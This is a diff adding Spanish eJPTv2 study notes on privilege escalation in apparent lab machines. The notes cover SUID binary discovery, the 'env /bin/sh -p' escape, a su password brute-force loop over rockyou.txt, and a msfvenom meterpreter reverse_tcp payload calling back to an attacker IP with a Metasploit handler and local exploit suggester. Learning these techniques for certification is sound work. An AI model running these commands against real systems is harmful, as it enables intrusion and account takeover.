@@ -1008,7 +1008,145 @@ Siempre indica la ruta absoluta del ejecutable, por lo que en este caso el coman
 
 ¡y listo!  
 
-![129](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/129.jpg)    
+![129](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/129.jpg)   
+
+# Elevación de privilegios en Linux – Binarios SUID  
+
+Si al ejecutar el comando `sudo -l` no obtengo ninguna información interesante, puedo probar con este comando, que es fundamental cuando hablamos de escalada de privilegios.  
+
+`sudo find / -perm -4000 2>/dev/null`  
+
+Utilizaremos la máquina básica para ver un ejemplo de escalada de privilegios SUID.  
+Después de realizar un escaneo con nmap, obtenemos los siguientes resultados:  
+
+![130](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/130.jpg)     
+
+Después de realizar fuzzing en el puerto 80 y no obtener ninguna información relevante, intentamos explorar el puerto 631.  
+Si abrimos una página web y vamos al menú "printers", somos capaces de obtener un nombre de usuario, "dimitri".  
+
+![131](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/131.jpg)     
+
+En este punto, podemos usar hydra para realizar un ataque de fuerza bruta y, después de esperar unos minutos, podremos obtener la contraseña, "mememe".  
+Una vez que estemos conectados con SSH, lanzaremos el comando:  
+
+`find / -perm -4000 2>/dev/null`  
+
+![132](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/132.jpg)     
+
+El archivo `env` debe llamarnos la atención, porque si visitamos gtfobins, podríamos ver que es vulnerable.  
+
+![133](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/133.jpg)    
+
+Podemos intentar ambos comandos y ver cuál de los dos funciona, en este caso el segundo.  
+Podemos ejecutarlo entrando en la carpeta `/usr/bin` y escribiendo `env /bin/sh -p`.  
+
+![134](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/134.jpg)    
+
+O bien desde la carpeta home, omitiendo el `./`.  
+
+![135](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/135.jpg)    
+
+**¡CONSEJO!**  
+Un comando útil descubierto durante la resolución de máquinas es este:  
+
+`while IFS= read -r pass; do echo "Trying $pass"; echo $pass | su seller 2>/dev/null && { echo "The password is > $pass"; break; }; done < rockyou.txt`  
+
+Supongamos que soy el usuario `prova` y después de analizar los permisos con `sudo -l` y con `find / -perm -4000` no encontré nada, y tampoco con `linpeas`.  
+Veo al abrir el archivo `/etc/passwd` que hay otro usuario llamado `seller`.  
+Lo que puedo hacer es transferir el archivo `rockyou` a la máquina víctima y probar un ataque de fuerza bruta para intentar descifrar la contraseña de `seller`.  
+
+# Elevación de privilegios automática con Metasploit en Linux y Windows 
+
+Si queremos escalar privilegios en una máquina Windows, podemos usar Metasploit.  
+Primero crearemos un archivo infectado para pasar a la máquina víctima con el comando:  
+
+`sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=6969 -f exe > file.exe`  
+
+Entonces, escribiremos el comando:  
+
+`sudo python3 -m http.server 80`   
+
+En la máquina Windows 7 navegaremos a la dirección http://10.10.10.10/file.exe y descargaremos el archivo infectado.  
+En la máquina atacante ahora deberíamos ejecutar Metasploit y lanzar el comando:  
+
+`use /multi/handler`  
+
+configurar las opciones adecuadas y escribir `run`.  
+
+**¡MUY IMPORTANTE!**  
+Asegúrate de configurar el mismo payload y el mismo puerto que usaste durante la generación del archivo malicioso con msfvenom.  
+
+![136](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/136.jpg)   
+
+Lanzamos entonces el archivo `file.exe` en la máquina Windows y obtenemos una sesión meterpreter.  
+
+Lo primero que debemos hacer es escribir el comando `shell` para obtener un símbolo del sistema de Windows y luego escribir el comando `whoami`.  
+
+![137](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/137.jpg)    
+
+Como podemos ver, no somos un usuario con privilegios administrativos.    
+Entonces pondremos en espera la sesión meterpreter escribiendo Ctrl + c.    
+
+![138](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/138.jpg)     
+
+En este punto, escribiremos el comando `background` y volveremos a la pantalla principal de Metasploit.  
+
+![139](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/139.jpg)   
+
+Entonces buscaremos una herramienta que nos permita encontrar exploits para la escalada de privilegios en Windows escribiendo el comando:  
+
+`search local_exploit_suggester`  
+
+![140](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/140.jpg)    
+
+Lo seleccionamos y, como siempre, usaremos `show options` para ver las opciones disponibles y configurarlas. Luego, lo ejecutaremos con el comando `run`.  
+
+![141](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/141.jpg)     
+
+**¡CONSEJO!**    
+Para ver las sesiones activas, utilizaré el comando:   
+
+`sessions -l `  
+
+![142](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/142.jpg)  
+
+Lo que hará será buscar exploits potenciales para la sesión en cuestión.  
+
+![143](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/143.jpg)    
+
+![144](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/144.jpg)  
+
+Una vez que obtengamos una lista similar a esta, deberemos enfocarnos en los que están en verde, que son los potencialmente funcionales, y probar uno por uno para ver cuál funciona.  
+En este caso, funcionará el 13, así que, como siempre, lo seleccionaremos y configuraremos las opciones adecuadas.  
+
+**¡IMPORTANTE!**  
+Es necesario copiar y pegar el nombre del exploit; en este caso, no funcionará escribiendo `use 13`.  
+
+![145](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/145.jpg)    
+
+![146](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/146.jpg)   
+
+**¡CONSEJO!**  
+Recuerda usar un LPORT diferente. En este ejemplo, se usó LPORT 6969 en el primer ataque, así que ahora se configurará LPORT 7070.  
+
+Una vez terminado, podré verificar si ha funcionado.  
+
+![147](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/147.jpg)    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
